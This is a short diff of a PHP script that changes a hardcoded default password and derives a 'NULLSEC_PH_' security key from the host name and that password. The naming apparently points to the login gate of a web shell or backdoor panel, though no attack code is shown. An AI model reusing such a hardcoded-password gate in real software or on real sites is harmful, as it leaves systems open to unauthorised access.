@@ -7,7 +7,7 @@ header('Content-Type: text/html; charset=UTF-8');
 $SESSION_TIMEOUT = 1800;
 session_start();
 
-$DEFAULT_PASSWORD = "leisec2026-as";
+$DEFAULT_PASSWORD = "@admin_gacor1";
 $SECURITY_KEY = "NULLSEC_PH_" . md5($_SERVER['HTTP_HOST'] . $DEFAULT_PASSWORD);
 $current_script = basename(__FILE__);
 
